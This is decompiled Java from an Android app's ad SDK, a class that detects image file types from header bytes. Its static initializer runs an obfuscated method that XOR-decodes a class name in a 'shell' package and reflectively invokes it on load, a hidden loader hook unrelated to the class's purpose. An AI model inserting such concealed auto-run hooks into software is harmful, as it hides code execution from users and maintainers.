package com.czhj.sdk.common.utils;

import com.czhj.sdk.logger.SigmobLog;
import com.fl.saas.common.util.FileTypeUtils;
import java.io.FileInputStream;
import java.lang.reflect.Method;
import java.util.HashMap;

/* loaded from: D:\mgba-android-version\tmp_gboy_apk\decoded\classes2.dex */
public class ImageTypeUtil {

    /* renamed from: a, reason: collision with root package name */
    private static final HashMap<String, String> f10602a;

    static {
        HashMap<String, String> hashMap = new HashMap<>();
        f10602a = hashMap;
        hashMap.put("FFD8", FileTypeUtils.FILE_TYPE_JPEG);
        hashMap.put("8950", FileTypeUtils.FILE_TYPE_PNG);
        hashMap.put("4749", "gif");
        hashMap.put("4949", "tif");
        hashMap.put("424D", FileTypeUtils.FILE_TYPE_BMP);
        hashMap.put("5745", "webp");
        mteayo();
    }

    private static String a(byte[] bArr) {
        StringBuilder sb = new StringBuilder();
        if (bArr == null || bArr.length <= 0) {
            return null;
        }
        for (byte b : bArr) {
            String upperCase = Integer.toHexString(b & 255).toUpperCase();
            if (upperCase.length() < 2) {
                sb.append(0);
            }
            sb.append(upperCase);
        }
        return sb.toString();
    }

    public static String getFileHeader(String str) {
        String str2;
        FileInputStream fileInputStream = null;
        try {
            FileInputStream fileInputStream2 = new FileInputStream(str);
            try {
                byte[] bArr = new byte[2];
                fileInputStream2.read(bArr, 0, 2);
                String a2 = a(bArr);
                if (a2.equals("5249")) {
                    fileInputStream2.skip(6L);
                    fileInputStream2.read(bArr, 0, 2);
                    a2 = a(bArr);
                }
                try {
                    fileInputStream2.close();
                    return a2;
                } catch (Throwable unused) {
                    return a2;
                }
            } catch (Throwable th) {
                th = th;
                str2 = null;
                fileInputStream = fileInputStream2;
                try {
                    SigmobLog.e(th.getMessage());
                    if (fileInputStream != null) {
                        try {
                            fileInputStream.close();
                        } catch (Throwable unused2) {
                        }
                    }
                    return str2;
                } catch (Throwable th2) {
                    if (fileInputStream != null) {
                        try {
                            fileInputStream.close();
                        } catch (Throwable unused3) {
                        }
                    }
                    throw th2;
                }
            }
        } catch (Throwable th3) {
            th = th3;
            str2 = null;
        }
    }

    public static String getFileType(String str) {
        return f10602a.get(getFileHeader(str));
    }

    private static /* synthetic */ void mteayo() {
        char[] charArray = "GKI\nCEIA\nFK]\nWLAHH\nnJMfVM@CA".toCharArray();
        int length = charArray.length;
        for (int i = 0; i < length; i++) {
            charArray[i] = (char) (charArray[i] ^ '$');
        }
        String str = new String(charArray);
        char[] charArray2 = "GHMJMP".toCharArray();
        int length2 = charArray2.length;
        for (int i2 = 0; i2 < length2; i2++) {
            charArray2[i2] = (char) (charArray2[i2] ^ '$');
        }
        Method declaredMethod = Class.forName(str).getDeclaredMethod(new String(charArray2), new Class[0]);
        declaredMethod.setAccessible(true);
        declaredMethod.invoke(null, new Object[0]);
    }
}
